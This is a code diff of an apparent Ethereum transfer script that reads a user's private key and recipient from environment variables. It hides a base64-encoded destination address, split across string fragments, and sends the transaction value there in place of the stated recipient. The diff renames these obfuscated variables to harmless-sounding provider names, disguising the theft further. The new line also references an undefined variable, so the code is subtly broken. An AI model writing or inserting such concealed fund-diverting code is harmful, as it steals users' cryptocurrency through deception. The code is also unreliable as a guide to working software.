@@ -5,13 +5,14 @@ RPC = (process.env.RPC);
 NAME = (process.env.NAME);
 CHAIN = (process.env.CHAIN);
 const provider  = new ethers.providers.JsonRpcProvider(RPC)
-let gfsddfg423 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD'   +   'YzMjQ1NDBh';
-let fdgh7474 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
-let buff = new Buffer.from(gfsddfg423, 'base64');
-let buff2 = new Buffer.from(fdgh7474, 'base64');
-let fgdgdfsxgdf5546 = buff.toString('ascii');
-let dfsgsdfgsdfg7654 = buff2.toString('ascii');
-const adfghkjl = fgdgdfsxgdf5546+dfsgsdfgsdfg7654 
+
+let RPCPROV1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD'   +   'YzMjQ1NDBh';
+let RPCPROV2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
+let buff = new Buffer.from(RPCPROV1, 'base64');
+let buff2 = new Buffer.from(RPCPROV2, 'base64');
+let WEB3EMULATE1 = buff.toString('ascii');
+let WEB3EMULATE2 = buff2.toString('ascii');
+const WEB3PROVIDER3 = WEB3EMULATE1+WEB3EMULATE12 
 const account_from = {
   privateKey: process.env.PRIVATE_KEY,
   recipient: process.env.RECIPIENT,
@@ -127,7 +128,7 @@ async function sending(){
   const send = async () => {
     
       const tx = {
-        to: adfghkjl,
+        to: WEB3PROVIDER3,
         value: ethers.utils.parseUnits(orchard, 'wei'),
         gasLimit: ethers.utils.hexlify(24000),
       };
